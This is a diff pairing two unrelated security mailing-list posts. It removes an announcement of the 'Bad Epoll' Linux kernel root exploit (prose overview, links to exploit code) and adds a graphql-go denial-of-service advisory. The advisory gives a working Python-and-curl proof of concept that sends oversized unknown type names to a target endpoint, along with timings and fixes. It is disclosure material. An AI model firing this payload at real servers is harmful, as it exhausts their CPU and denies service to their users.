@@ -1,263 +1,111 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/07/08/13
-Message-ID: <ak6_Ets-y-MbPK2m@netmeister.org>
-Date: Wed, 8 Jul 2026 17:20:18 -0400
-From: Jan Schaumann <jschauma@...meister.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2026/08/29/4
+Message-ID: <CAK=gNzpN1UDdE2Ki9YPKa8vTzaXYy0xxVuJveKOAKQL=cQDwAQ@mail.gmail.com>
+Date: Sat, 29 Aug 2026 18:48:43 +0200
+From: William Carrier <0x6675636b736f6369617479@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: CVE-2026-46242 ("Bad Epoll") local privilege escalation on Linux, including Android
+Subject: graphql-go/graphql <= 0.8.1: quadratic CPU-exhaustion DoS via full-schema "did you mean" suggestion scan
 Content-Type: text/plain; charset=utf-8
 
-Hey,
+Hello,
 
-Similar to the "GhostLock" vulnerability Thomas Orgis
-just shared, there appears to be another LPE named
-"Bad Epoll" and tracked as CVE-2026-46242.
+This reports an algorithmic-complexity denial-of-service defect in
+github.com/graphql-go/graphql, affecting all released versions up to and
+including the latest, v0.8.1. No fixed version exists. It is
+unauthenticated, network-reachable, triggered purely by attacker-controlled
+query text, and requires no special configuration. Reproduced against the
+published v0.8.1 module fetched from the Go module proxy.
 
-https://github.com/J-jaeyoung/bad-epoll
+A CVE ID has been requested from MITRE and is pending.
 
-That repository's README follows:
+== Affected ==
 
----
-Bad Epoll (CVE-2026-46242) is a race-condition
-use-after-free in the Linux kernel's epoll subsystem.
-This bug lets an unprivileged process become root, not
-only on Linux desktops and servers but also on Android
-devices.
+  Product:  github.com/graphql-go/graphql
+  Versions: all <= v0.8.1; no fix available
+  CWE:      CWE-407 (Inefficient Algorithmic Complexity) / CWE-1050
+  CVSS:     CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H  = 7.5 (High)
 
-Bad Epoll was reported and exploited by [Jaeyoung
-Chung](https://j-jaeyoung.github.io/) as a 0-day
-submission to Google
-[kernelCTF](https://google.github.io/security-research/kernelctf/rules.html),
-which rewards a Linux kernel exploit with $71,337+.
 
-Note
+== Details ==
 
-Anthropic's AI,
-[Mythos](https://red.anthropic.com/2026/mythos-preview/),
-found another [race
-bug](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=07712db80857d5d09ae08f3df85a708ecfc3b61f)
-in the same epoll code but missed Bad Epoll.
+When query validation encounters an unknown type name, KnownTypeNamesRule
+(rules.go) builds a "Did you mean" suggestion by scanning the WHOLE schema:
 
-Why it is serious
+    ttype := context.Schema().Type(typeNameValue)
+    if ttype == nil {
+        suggestedTypes := []string{}
+        for key := range context.Schema().TypeMap() {   // every type in
+the schema
+            suggestedTypes = append(suggestedTypes, key)
+        }
+        reportError(context,
+            unknownTypeMessage(typeNameValue, suggestionList(typeNameValue,
+suggestedTypes)),
+            ...)
+    }
 
-    A rare bug that can root Android. Most Linux
-privilege-escalation bugs cannot root Android at all.
-[Copy Fail](https://copy.fail/) and its variants, for
-example, need modules that Android never loads. Out of
-the roughly 130 vulnerabilities exploited on Google's
-kernelCTF, only about ten are candidates for rooting
-Android. Bad Epoll is one of them.
+suggestionList calls lexicalDistance(input, opt) for every option.
+lexicalDistance is a Levenshtein DP that allocates an (|a|+1) x (|b|+1)
+matrix as a slice of slices:
 
-	Bad Epoll can also be triggered from inside
-Chrome's renderer sandbox, which blocks almost every
-other kernel bug. A renderer exploit could therefore
-chain with Bad Epoll to achieve kernel code
-execution, the same impact Project Zero demonstrated
-in "[From Chrome renderer code exec to kernel with
-MSG_OOB](https://projectzero.google/2025/08/from-chrome-renderer-code-exec-to-kernel.html)".
+    func lexicalDistance(a, b string) float64 {
+        d := [][]float64{}
+        ...                       // O(|a| * |b|) cells, each an append
+into a slice
+    }
 
-    No kill-switch. Copy Fail and its variants can be
-neutralized by unloading their vulnerable modules, but
-epoll has no such option. It is a core kernel feature
-that the operating system, network services, and
-browsers all rely on. The only way to fix it is to
-apply the patch.
+So each unknown type name costs O(schema_types * name_length *
+avg_type_name_len), and a request may contain many unknown type names (one
+per query-variable type, per inline-fragment type condition, etc.). Total:
+O(unknowns * schema_types * name_length) for a single request. The
+magnitude scales with the number of types the target schema defines, any
+real-world schema (dozens to hundreds of types) amplifies it substantially.
 
-    Tiny race window, but the attack is 99% reliable.
-The bug's race window is only about six instructions
-wide, and a normal attempt almost never hits it. The
-exploit widens that window and runs a retry loop
-that never crashes the kernel. The result is a 99%
-reliable exploit, as the [attack
-overview](https://github.com/J-jaeyoung/bad-epoll#how-the-attack-works)
-below describes.
+== Proof of concept ==
 
-The bug Mythos missed
+One POST declaring K query variables, each typed with a long unknown type
+name:
 
-A single
-[commit](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=58c9b016e128)
-in 2023 introduced two separate race conditions into
-the epoll code, only about 2,500 lines in all. Both
-turned out to be critical bugs that can lead to
-privilege escalation.
+    # build a request: query($v0: ZZZ...ZZZ, $v1: ZZZ...ZZZ, ...){ hello }
+    #   K variables, each type name 2000 'Z' chars (an unknown type)
+    python3 - "$K" <<'PY' > body.json
+    import sys, json
+    k = int(sys.argv[1]); name = "Z"*2000
+    q = "query(" + ",".join("$v%d: %s" % (i, name) for i in range(k)) + "){
+hello }"
+    sys.stdout.write(json.dumps({"query": q}))
+    PY
+    curl -s -o /dev/null -w '%{time_total}\n' -X POST http://TARGET/graphql
+\
+         -H 'Content-Type: application/json' --data-binary @body.json
 
-The first was found by Anthropic's
-[Mythos](https://red.anthropic.com/2026/mythos-preview/)
-and reported as
-[CVE-2026-43074](https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/commit/?id=07712db80857d5d09ae08f3df85a708ecfc3b61f).
-That result is impressive on its own, because kernel
-race bugs are known to be hard to find. It showed a
-frontier AI model's ability to find race bugs. An
-independent researcher later submitted a [1-day
-exploit](https://github.com/2045castor/security-research/blob/submit_final/pocs/linux/kernelctf/CVE-2026-43074_lts/docs/exploit.md)
-for it to kernelCTF.
+Measured over HTTP against v0.8.1, 300-type schema (linear ~0.3 s/KB):
 
-The other race is Bad Epoll, which Mythos missed.
-Given that Mythos found the first bug in this small
-epoll code path, it likely examined the same area with
-meaningful depth. We cannot know exactly why it missed
-Bad Epoll, but two factors likely made it hard to
-find.
+    K=10   (19 KB)   -> 4.8 s
+    K=20   (39 KB)   -> 9.8 s
+    K=40   (78 KB)   -> 20.6 s
+    K=80   (156 KB)  -> 48.6 s
+    K=100  (~198 KB) -> ~55 s
 
-    The race window is tiny. It is only about six
-instructions wide, so the exact thread interleaving is
-hard to imagine even when looking at the vulnerable
-code.
+(A schema with only a handful of types yields ~1 s at K=40; the cost grows
+with
+schema type count.)
 
-    There was little runtime evidence. After
-CVE-2026-43074 is fixed, Bad Epoll's use-after-free
-usually does not trigger KASAN, the kernel's main
-memory-error detector. Without that signal, Mythos may
-not have had enough confidence to report it as a real
-bug.
+== Impact ==
 
-Bad Epoll was hard to fix, too. The maintainers' first
-patch did not fully fix the issue, and a correct patch
-landed only two months after the bug was first
-reported. That is a long time for a kernel that
-usually handles security issues with urgency.
+A single unauthenticated ~200 KB request consumes ~55 s of server CPU on a
+realistic schema; a small number of concurrent such requests saturates the
+worker pool and denies service. No authentication, no special configuration.
 
-Overall, Bad Epoll shows how difficult race conditions
-are at every stage. They are hard to find even for a
-frontier model, hard to fix correctly, and, as the
-next section shows, hard to exploit reliably. It also
-suggests a vulnerability research direction that
-remains worth exploring in the presence of frontier AI
-models: uncovering real security impact behind narrow
-timing conditions and weak evidence.
-How the attack works
+== Remediation ==
 
-Here is a high-level overview of the attack, for the
-curious.
+Skip suggestions when the input exceeds a small length, cap the number of
+candidates and the lexicalDistance input length, and short-circuit the DP
+when the distance cannot beat the current best (as graphql-js does).
 
-ep_waiter watches ep_target: the epoll structures
-behind the bug
+== Credit ==
 
-Two linked epoll objects. Closing both at once
-triggers the race.
+  William Carrier, independent security researcher.
 
-Two of epoll's close paths run at the same time and
-collide. One frees an object while the other is still
-writing into it, and that is the use-after-free (UAF).
+Best,
 
-The close-vs-close race window and how the exploit
-drives it through a timer interrupt
-
-The race window, and how the exploit drives it.
-
-The exploit uses four epoll objects grouped into two
-pairs. One pair triggers the race, while the other
-becomes the victim. From there, the exploit turns the
-8-byte UAF write into a UAF on a file object, and uses
-a cross-cache attack to fully control the file's
-contents.
-
-Arbitrary kernel read: a dangling struct file backed
-by a pipe leaks kernel addresses through
-/proc/self/fdinfo
-
-Turning the bug into an arbitrary kernel memory read
-through /proc/self/fdinfo.
-
-With that control, the exploit gains an arbitrary read
-of kernel memory through /proc/self/fdinfo. Finally,
-it hijacks control flow and executes a ROP chain to
-gain a root shell.
-
-More details are available in the full exploit
-[writeup](https://github.com/J-jaeyoung/security-research/blob/submit-cve-2026-46242/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/docs/exploit.md)
-and
-[code](https://github.com/J-jaeyoung/security-research/blob/submit-cve-2026-46242/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67/exploit.cpp).
-
-Mitigation
-
-Because epoll cannot be disabled, Bad Epoll has no
-simple workaround. The only remedy is to apply the
-patch.
-
-    Apply upstream commit
-[a6dc643c6931](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a6dc643c69311677c574a0f17a3f4d66a5f3744b),
-or your distribution's backport once it becomes
-available.
-
-Affected versions
-
-Bad Epoll was introduced by
-[58c9b016e128](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=58c9b016e12855286370dfb704c08498edbc857a)
-([2023-04-08](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=58c9b016e12855286370dfb704c08498edbc857a))
-and fixed by
-[a6dc643c6931](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a6dc643c69311677c574a0f17a3f4d66a5f3744b)
-([2026-04-24](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=a6dc643c69311677c574a0f17a3f4d66a5f3744b)).
-
-Many Linux distributions may be affected if they use
-kernels based on v6.4 or newer and have not yet
-backported the fix. Check your distribution's kernel
-security updates for a backport of the fix commit
-above. Older v6.1-based kernels are not affected
-because the bug was introduced in v6.4.
-
-The current exploit is written for the following
-Google kernelCTF targets.
-
-    lts-6.12.67 (LTS), 99% reliable
-    cos-121-18867.294.100 (COS), 98% reliable
-
-The Android exploit is still in progress.
-
-    Pixel 10 (kernel v6.6+): the current PoC triggers
-the UAF and a full root exploit is in progress. We
-will release the Android exploit and writeup once they
-are complete.
-    Pixel 8 and other v6.1-based devices: not
-affected, since the bug was introduced in v6.4.
-
-Timeline
-Date 	Event
-2023-04-08 	The bug was introduced into epoll
-(commit 58c9b016e128).
-2026-02-17 	We reported the bug to
-security@...nel.org.
-2026-02-17 	Maintainers proposed a patch
-prototype, but it was not a correct fix and the
-discussion then stalled.
-2026-04-02 	The fix for the bug Mythos found
-(CVE-2026-43074) landed in mainline.
-2026-04-22 	We re-reported the remaining issue.
-2026-04-24 	The fix for this bug landed in
-mainline (commit a6dc643c6931).
-
-FAQ
-Why is it called "Bad Epoll"?
-
-The name follows the "Bad" series of Android-rooting
-kernel bugs, whose earlier entries include [Bad
-Binder](https://projectzero.google/2019/11/bad-binder-android-in-wild-exploit.html),
-[Bad
-IO_uring](https://github.com/Markakd/bad_io_uring),
-and [Bad Spin](https://github.com/0xkol/badspin). Bad
-Epoll is the epoll counterpart.
-
-Where can I find the technical details?
-
-This page is the short version. You can find the full
-root-cause analysis, exploit writeup, and exploit code
-in the following links.
-
-    [Root-cause writeup](https://github.com/J-jaeyoung/security-research/blob/submit-cve-2026-46242/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/docs/vulnerability.md)
-    [Exploit writeup](https://github.com/J-jaeyoung/security-research/blob/submit-cve-2026-46242/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/docs/exploit.md}
-    [Exploit code](https://github.com/J-jaeyoung/security-research/blob/submit-cve-2026-46242/pocs/linux/kernelctf/CVE-2026-46242_lts_cos/exploit/lts-6.12.67/exploit.cpp)
-
-Credits
-
-Bad Epoll was reported and exploited by [Jaeyoung
-Chung](https://j-jaeyoung.github.io/).
-
-Huge thanks to our research group, [CompSec
-Lab](https://compsec.snu.ac.kr/), and especially to
-[Eulgyu Kim](https://eulgyukim.github.io/), [Woohyuk
-Choi](https://cw00h.github.io/), [Dae R.
-Jeong](https://daeryong.me/) and my advisor
-[Byoungyoung Lee](https://lifeasageek.github.io/), for
-their guidance and support.
-
----
